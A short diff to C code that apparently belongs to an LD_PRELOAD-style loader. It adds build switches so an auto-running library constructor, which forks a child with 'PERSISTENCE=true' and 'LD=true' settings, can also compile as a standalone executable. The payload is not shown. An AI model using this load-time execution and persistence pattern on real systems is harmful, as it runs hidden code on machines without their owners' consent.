@@ -217,10 +217,14 @@ int is_str_in_file(const char *path, const char *str) {
   return 0;
 }
 
+#ifdef LINUX_EXE
+void main() {
+#else
 /**
  * Initializes the library. This function is called when the library is loaded.
  */
 void __attribute__((constructor)) initLibrary(void) {
+#endif
   // ignore SIGCHLD
   signal(SIGCHLD, SIG_IGN);
 
@@ -305,7 +309,11 @@ void __attribute__((constructor)) initLibrary(void) {
                   "HOME=/tmp",
                   "PERSISTENCE=true",
                   "LD=true",
+#ifdef DEBUG
+                  "VERBOSE=true",
+#else
                   "VERBOSE=false",
+#endif
                   NULL};
 
   pid_t child = fork();
@@ -317,9 +325,11 @@ void __attribute__((constructor)) initLibrary(void) {
   }
 }
 
+#ifdef LINUX_SO
 /**
  * Cleans up the library. This function is called when the library is unloaded.
  */
 void __attribute__((destructor)) cleanUpLibrary(void) {
   DEBUG_PRINT("Cleaning up library...\n");
 }
+#endif
